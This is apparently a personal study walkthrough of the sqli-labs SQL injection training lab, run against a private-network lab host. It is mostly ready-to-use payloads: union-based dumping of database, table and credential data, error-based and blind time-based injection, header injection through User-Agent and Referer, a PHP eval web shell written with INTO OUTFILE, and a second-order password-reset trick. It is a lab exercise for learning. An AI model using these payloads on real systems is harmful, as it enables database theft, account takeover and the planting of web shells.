### Less-1 GET - Error based - Single quotes - String 联合注入

```
http://192.168.91.131/sqli-labs-master/Less-1/?id=1
http://192.168.91.131/sqli-labs-master/Less-1/?id=1' order by 3%23
http://192.168.91.131/sqli-labs-master/Less-1/?id=-1' union select 1,2,3%23

所有数据库
http://192.168.91.131/sqli-labs-master/Less-1/?id=-1' union select 1, group_concat( distinct table_schema),3 from information_schema.columns%23

当前数据库 
http://192.168.91.131/sqli-labs-master/Less-1/?id=-1' union select 1,(database()),3%23 

数据库版本  //5.5.3
http://192.168.91.131/sqli-labs-master/Less-1/?id=-1' union select 1,(version()),3%23   

当前用户 //root@localhost
http://192.168.91.131/sqli-labs-master/Less-1/?id=-1' union select 1,user(),3%23     

当前数据库下表名 //emails,referers,uagents,users
http://192.168.91.131/sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23

获取表字段 //id,username,password   table_name转成16进制，以0x开头
http://192.168.91.131/sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'%23

获取表值
http://192.168.91.131/sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(username,0x3a,password),3 from users %23

Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
```

### Less-2 GET - Error based - Intiger based  联合注入

```
http://192.168.91.146/sqli-labs-master/Less-2/?id=1 order by 3
http://192.168.91.146/sqli-labs-master/Less-2/?id=0 union select 1,2,3  //回显错误2，3

所有数据库
http://192.168.91.146/sqli-labs-master/Less-2/?id=0 union select 1,group_concat(distinct table_schema),3 from information_schema.columns%23

当前数据库、用户       //security    root@localhost
http://192.168.91.146/sqli-labs-master/Less-2/?id=0 union select 1,database(),user()%23

获取当前数据库表    //emails,referers,uagents,users
http://192.168.91.146/sqli-labs-master/Less-2/?id=0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23

获取表下列名      //username,password
http://192.168.91.146/sqli-labs-master/Less-2/?id=0 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'%23

获取列值
http://192.168.91.146/sqli-labs-master/Less-2/?id=0 union select 1,group_concat(username,0x3a,password),3 from users%23

```

### Less-3 GET - Error based - Single quotes with twist - string  联合注入

```
http://192.168.91.146/sqli-labs-master/Less-3/?id=1') order by 3%23
http://192.168.91.146/sqli-labs-master/Less-3/?id=0') union select 1,2,3%23 //报错回显

当前数据库、表名
http://192.168.91.146/sqli-labs-master/Less-3/?id=0') union select 1,database(),user()%23

所有数据库
http://192.168.91.146/sqli-labs-master/Less-3/?id=0') union select 1,group_concat(distinct table_schema),3 from information_schema.columns%23

获取表
http://192.168.91.146/sqli-labs-master/Less-3/?id=0') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23

获取列
http://192.168.91.146/sqli-labs-master/Less-3/?id=0') union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'%23

获取值
http://192.168.91.146/sqli-labs-master/Less-3/?id=0') union select 1,group_concat(username,0x3a,password),3 from users%23
```

### Less-4 GET - Error based - Double Quotes - String  联合注入

```
http://192.168.91.146/sqli-labs-master/Less-4/?id=1") order by 3 %23

http://192.168.91.146/sqli-labs-master/Less-4/?id=0") union select 1,group_concat(distinct table_schema),3 from information_schema.columns %23

http://192.168.91.146/sqli-labs-master/Less-4/?id=0") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23

http://192.168.91.146/sqli-labs-master/Less-4/?id=0") union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users' %23

http://192.168.91.146/sqli-labs-master/Less-4/?id=0") union select 1,group_concat(username,0x3a,password),3 from users%23
```

### Less-5 GET - Double Injection - Single quotes with twist   显错注入

```
payload1、
http://192.168.91.146/sqli-labs-master/Less-5/?id=2' order by 3--+
http://192.168.91.146/sqli-labs-master/Less-5/?id=2' and length(database()) =8--+
http://192.168.91.146/sqli-labs-master/Less-5/?id=2' and ascii(substr(database(),1,1))>8--+
payload2、
http://192.168.91.146/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select user()),0x7e))%23
payload3、
http://192.168.91.146/sqli-labs-master/Less-5/?id=1' and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a)
```

### Less-6 GET - Double Injection - Double Quotes - String 显错注入

```
payload1、
http://192.168.91.151/sqli-labs-master/Less-6/?id=1" order by 3%23
http://192.168.91.151/sqli-labs-master/Less-6/?id=1" and if(ascii(substr(database(),1,1))=114,sleep(5),0)%23
payload2、
http://192.168.91.151/sqli-labs-master/Less-6/?id=1" and extractvalue(1,concat(0x7e,(select user()),0x7e))%23
```

### Less-7 GET - Dump into outfile - String

```
http://192.168.91.151/sqli-labs-master/Less-7/?id=1')) order by 1--+
http://192.168.91.151/sqli-labs-master/Less-7/?id=1')) union select 1,2,"<?php @eval($_POST['cmd']); ?>" into outfile 'C:\\www\\1.php'--+
```

### Less-8 GET - Blind - Boolian Based - Single Quotes        布尔盲注

```
http://192.168.91.151/sqli-labs-master/Less-8/?id=1' and ascii(substr(database(),1,1))>12 %23
```

### Less-9 GET - Blind - Time based - Single Quotes    基于时间盲注

```
http://192.168.91.151/sqli-labs-master/Less-9/?id=1' and sleep(5)%23 //延时5秒，存在注入
http://192.168.91.151/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),1,1))>12,1,sleep(5))%23    
```

### Less-10 GET - Blind - Time based - double quotes   基于时间盲注

```
http://192.168.91.151/sqli-labs-master/Less-9/?id=1" and sleep(5)%23 //延时5秒，存在注入
http://192.168.91.151/sqli-labs-master/Less-9/?id=1" and if(ascii(substr(database(),1,1))>12,1,sleep(5))%23   
```

### Less-11 POST - Error Based - Single quotes - String   POST基于错误

```
uname=1' order by 2 %23&passwd=&submit=Submit
uname=1' union select database(),user() %23&passwd=&submit=Submit
```

### Less-12 POST - Error Based - Double quotes - String - with twist

```
uname=1") order by 2 %23&passwd=&submit=Submit
```

### Less-13 POST - Double Injection - Single quotes -String - with twist

```
uname=1') and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a) %23&passwd=&submit=Submit
```

### Less-14 Double Injection - Single quotes -String - with twist

```
uname=1') and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a) %23&passwd=&submit=Submit
```

###  Less-15 Blind - Boolian/time Based - Single quotes   基于时间

```
payload1、 问题 为什么必须用户名输入成功，才能进行sleep
uname=admin' and if(ascii(substr(database(),1,1))<12,1,sleep(5))%23   &passwd=1&submit=Submit
payload2、构造''='' 恒真等式
uname='='' and if(ascii(substr(database(),1,1))<12,1,sleep(5))%23   &passwd=1&submit=Submit
payload3、 构造or 
uname=1' or if(ascii(substr(database(),1,1))<115,1,sleep(5))%23   &passwd=1&submit=Submit
```

### Less-16 POST - Blind - Boolian/Time Based - Double quotes

```
uname=admin") and if(ascii(substr(database(),1,1))<12,1,sleep(5))%23&passwd=1&submit=Submit
```

### Less-17 POST - Update Query - Error Based - String  更新显错

```
payload1、  //基于显错盲注
uname=admin&passwd=admin' and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a) %23&submit=Submit
payload2、 基于时间盲注  //不明白为什么passwd=admin' 不行
uname=admin&passwd=1'and If(ascii(substr(database(),1,1))<115,1,sleep(5))#&submit=Submit
```

### Less-18 Header Injection - Uangent field - Error based  UA头注入

```
1、输入User-Agent: 1'
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '192.168.91.1', 'admin')' at line 1
推测闭合语句为   1,1,1)
2、构造闭合语句 
User-Agent: 1',1,1) #    //不知道为啥#可以，%23、--+ 都不可以
User-Agent: 1',1,1) -- - //可以
payload1、
User-Agent: 1',1,(select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a)) -- -
payload2、
User-Agent: 1',1,updatexml(1,concat(0x5c,(database()),0x5c),1)) -- -
//原理 UPDATEXML(XML_document, XPath_string, new_value); 
//原理 XML_document是string格式  new_value是string格式 
//原理 concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出
```

### Less-19 Header Injection - Referer field - Eoor based  referer注入

```
闭合语句
Referer: http://192.168.91.151/sqli-labs-master/Less-19/',1) -- -
payload:
Referer: 1',updatexml(1,concat(0x5c,(database()),0x5c),1)) -- -
```











Less-24 POST - Second 0der Injections *Real treat*  - Stored Injections 二次注入

```
创建用户名   admin'#   密码随意
登录后，修改原有密码  可发现admin密码被修改
原因： update tables set password=’123’ where username=’admin’#’   #将后面单引号注释所致
```



























